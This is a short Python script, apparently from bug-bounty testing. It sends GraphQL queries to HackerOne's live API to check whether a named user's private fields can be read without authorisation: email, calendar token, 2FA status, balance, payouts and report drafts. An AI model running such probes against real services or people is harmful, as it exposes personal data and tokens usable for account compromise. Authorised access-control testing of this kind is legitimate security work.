# -*- coding: utf-8 -*-
"""h1x38: User 敏感字段对别人可见性(公开 profile 对照)"""
import sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0'})

qs = {
    'PII1': '{ user(username: "bate5a") { username email } }',
    'PII2': '{ user(username: "bate5a") { username email_alias unconfirmed_email } }',
    'PII3': '{ user(username: "bate5a") { username calendar_token totp_enabled webauthn_enabled } }',
    'PII4': '{ user(username: "bate5a") { username balance total_payouts payments_user { __typename } } }',
    'PII5': '{ user(username: "bate5a") { username bio country name website } }',
    'PII6': '{ user(username: "bate5a") { username report_drafts(first: 5) { total_count } } }',
}
for k, q in qs.items():
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': q}, timeout=20)
        print(f'=== {k} STATUS={r.status_code} ===')
        print(r.text[:800])
        print()
    except Exception as e:
        print(f'=== {k} ERR {e} ===')
